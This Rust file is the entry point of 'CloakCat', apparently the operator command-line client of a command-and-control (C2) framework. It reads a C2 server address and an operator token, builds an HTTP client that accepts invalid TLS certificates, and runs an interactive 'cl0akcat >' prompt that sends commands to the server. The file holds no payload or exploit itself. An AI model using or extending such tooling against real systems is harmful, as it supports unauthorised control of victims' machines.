//! CloakCat operator CLI entry point.

mod build;
mod commands;
mod display;
mod http;
mod output;
mod types;

use std::sync::atomic::Ordering;
use std::sync::Arc;

use anyhow::Result;
use reqwest::blocking::Client;
use rustyline::error::ReadlineError;
use rustyline::DefaultEditor;

use crate::commands::{dispatch, Flow};
use crate::output::print_banner;

const VERSION: &str = env!("CARGO_PKG_VERSION");

fn main() -> Result<()> {
    dotenvy::dotenv().ok();
    let base =
        std::env::var("C2_BASE").unwrap_or_else(|_| "http://127.0.0.1:3000".to_string());
    let operator_token = std::env::var("OPERATOR_TOKEN")
        .expect("OPERATOR_TOKEN must be set (env or .env)");

    let mut headers = reqwest::header::HeaderMap::new();
    headers.insert(
        "X-Operator-Token",
        reqwest::header::HeaderValue::from_str(&operator_token)
            .expect("invalid OPERATOR_TOKEN value"),
    );

    let cli = Client::builder()
        .timeout(std::time::Duration::from_secs(30))
        .default_headers(headers)
        .danger_accept_invalid_certs(true)
        .build()?;

    let cancel = Arc::new(std::sync::atomic::AtomicBool::new(false));
    let hard_exit = Arc::new(std::sync::atomic::AtomicBool::new(false));
    {
        let cancel = cancel.clone();
        let hard_exit = hard_exit.clone();
        ctrlc::set_handler(move || {
            if cancel.swap(true, Ordering::SeqCst) {
                hard_exit.store(true, Ordering::SeqCst);
            }
        })?;
    }

    print_banner(VERSION);
    println!("Cat CTL connected to {base}");
    println!("Type 'help' for commands. Ctrl+C stops a running command (tail). Ctrl+C twice exits.");

    let mut rl = DefaultEditor::new()?;
    loop {
        if hard_exit.load(Ordering::SeqCst) {
            println!();
            break;
        }
        match rl.readline("cl0akcat > ") {
            Ok(line) => {
                let line = line.trim();
                if line.is_empty() {
                    continue;
                }
                let _ = rl.add_history_entry(line);

                match dispatch(&cli, &base, &operator_token, line, cancel.clone()) {
                    Ok(Flow::Continue) => {}
                    Ok(Flow::Quit) => break,
                    Err(e) => eprintln!("error: {e:#}"),
                }
            }
            Err(ReadlineError::Interrupted) | Err(ReadlineError::Eof) => {
                println!();
                break;
            }
            Err(e) => return Err(e.into()),
        }
    }
    Ok(())
}
